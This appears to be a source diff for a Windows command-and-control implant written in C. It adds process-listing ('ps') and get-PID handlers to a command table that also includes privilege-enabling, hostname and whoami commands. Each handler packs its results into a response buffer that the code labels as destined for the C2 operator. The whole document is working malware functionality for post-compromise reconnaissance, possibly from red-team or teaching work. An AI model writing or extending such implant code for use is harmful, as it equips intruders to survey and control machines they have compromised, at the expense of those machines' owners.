@@ -9,13 +9,9 @@ CONST COMMAND_MAP G_CommandTable[] = {
 	{ CMD_ENABLE_PRIVILEGE, CmdEnablePrivilege },
 	{ CMD_DISABLE_PRIVILEGE, CmdDisablePrivilege },
 	{ CMD_HOSTNAME, CmdHostname },
-	{ CMD_WHOAMI, CmdWhoami}
-
-
-	
-	
-	
-	
+	{ CMD_WHOAMI, CmdWhoami},
+	{ CMD_PS, CmdPs},
+	{ CMD_GETPID, CmdGetPid}
 
 };
 
@@ -335,6 +331,165 @@ cleanup:
 	if (sysInfo.computerName) ImplantHeapFree(sysInfo.computerName);
 	if (sysInfo.userName) ImplantHeapFree(sysInfo.userName);
 	if (sysInfo.architecture) ImplantHeapFree(sysInfo.architecture);
+
+	return status;
+}
+
+DWORD CmdPs(
+	DWORD dataLen,
+	CONST PBYTE data,
+	PBYTE* responseData,
+	DWORD* responseLen
+)
+{
+	UNREFERENCED_PARAMETER(dataLen);
+	UNREFERENCED_PARAMETER(data);
+
+	DWORD status = NO_ERROR;
+	PBYTE responseBuffer = NULL;
+
+	// start with enough space to hold the total number of processes (1 DWORD)
+	DWORD totalLength = sizeof(DWORD);
+	WCHAR** processNames = NULL;
+
+	if (responseData != NULL) *responseData = NULL;
+	if (responseLen != NULL) *responseLen = 0;
+
+	// get process information struct
+	ProcessInfo_t psInfo = GetProcessInfo();
+
+	if (psInfo.processArray == NULL || psInfo.numProcesses == 0) {
+		status = ERROR_MEMORY_ALLOCATION_FAILED;
+		goto cleanup;
+	}
+
+	// allocate an array to hold all the process name pointers temporarily 
+	// (so we only have to query the OS once per process)
+	processNames = (WCHAR**)ImplantHeapAlloc(psInfo.numProcesses * sizeof(WCHAR*));
+	if (processNames == NULL) {
+		status = ERROR_MEMORY_ALLOCATION_FAILED;
+		goto cleanup;
+	}
+
+	// first pass: Fetch the names and calculate the exact payload size
+	for (DWORD i = 0; i < psInfo.numProcesses; i++)
+	{
+		DWORD pid = psInfo.processArray[i];
+		processNames[i] = GetProcessName(pid);
+
+		DWORD nameBytes = 0;
+		if (processNames[i] != NULL) {
+			// calculate length of string + null terminator
+			nameBytes = (DWORD)(wcslen(processNames[i]) + 1) * sizeof(WCHAR);
+		}
+		else {
+			// if we lack permissions to get the name, just pack an empty string
+			nameBytes = sizeof(WCHAR);
+		}
+
+		// add size: [DWORD pid] + [DWORD nameLength] + [WCHAR[] stringBytes]
+		totalLength += sizeof(DWORD) + sizeof(DWORD) + nameBytes;
+	}
+
+	// allocate the C2 response buffer now that we know the exact size
+	responseBuffer = (PBYTE)ImplantHeapAlloc(totalLength);
+	if (responseBuffer == NULL) {
+		status = ERROR_MEMORY_ALLOCATION_FAILED;
+		goto cleanup;
+	}
+
+	// pack the buffer sequentially
+	PBYTE offset = responseBuffer;
+
+	// pack the total number of processes at the very beginning
+	*((DWORD*)offset) = psInfo.numProcesses;
+	offset += sizeof(DWORD);
+
+	// second pass: Pack the actual data
+	for (DWORD i = 0; i < psInfo.numProcesses; i++)
+	{
+		DWORD pid = psInfo.processArray[i];
+		DWORD nameBytes = processNames[i] ? (DWORD)(wcslen(processNames[i]) + 1) * sizeof(WCHAR) : sizeof(WCHAR);
+
+		// Pack PID
+		*((DWORD*)offset) = pid;
+		offset += sizeof(DWORD);
+
+		// Pack Name Length
+		*((DWORD*)offset) = nameBytes;
+		offset += sizeof(DWORD);
+
+		// Pack Name String
+		if (processNames[i] != NULL) {
+			memcpy(offset, processNames[i], nameBytes);
+		}
+		else {
+			// Put a manual null-terminator for empty strings
+			((WCHAR*)offset)[0] = L'\0';
+		}
+		offset += nameBytes;
+	}
+
+	// assign output pointers
+	*responseData = responseBuffer;
+	*responseLen = totalLength;
+
+cleanup:
+	// Free all the individual process name strings we fetched
+	if (processNames != NULL) {
+		for (DWORD i = 0; i < psInfo.numProcesses; i++) {
+			if (processNames[i] != NULL) {
+				ImplantHeapFree(processNames[i]);
+			}
+		}
+		// Free the temporary array itself
+		ImplantHeapFree(processNames);
+	}
+
+	// Free the PID array returned by GetProcessInfo
+	if (psInfo.processArray != NULL) {
+		ImplantHeapFree(psInfo.processArray);
+	}
+
+	// If anything failed, clean up the main C2 buffer to prevent memory leaks
+	if (status != NO_ERROR && responseBuffer != NULL) {
+		ImplantHeapFree(responseBuffer);
+		if (responseData != NULL) *responseData = NULL;
+		if (responseLen != NULL) *responseLen = 0;
+	}
+
+	return status;
+}
+
+DWORD CmdGetPid(
+	DWORD dataLen,
+	CONST PBYTE data,
+	PBYTE* responseData,
+	DWORD* responseLen
+)
+{
+	UNREFERENCED_PARAMETER(dataLen);
+	UNREFERENCED_PARAMETER(data);
+
+	DWORD status = NO_ERROR;
+	PBYTE responseBuffer = NULL;
+	DWORD totalLength = sizeof(DWORD);
+
+	if (responseData != NULL) *responseData = NULL;
+	if (responseLen != NULL) *responseLen = 0;
+
+	// allocate a 4-byte buffer
+	responseBuffer = (PBYTE)ImplantHeapAlloc(totalLength);
+	if (responseBuffer == NULL) {
+		return ERROR_MEMORY_ALLOCATION_FAILED;
+	}
+
+	// get the implant's current PID and pack it directly into the buffer
+	*((DWORD*)responseBuffer) = GetCurrentProcessId();
+
+	// assign the output pointers
+	*responseData = responseBuffer;
+	*responseLen = totalLength;
 
 	return status;
 }
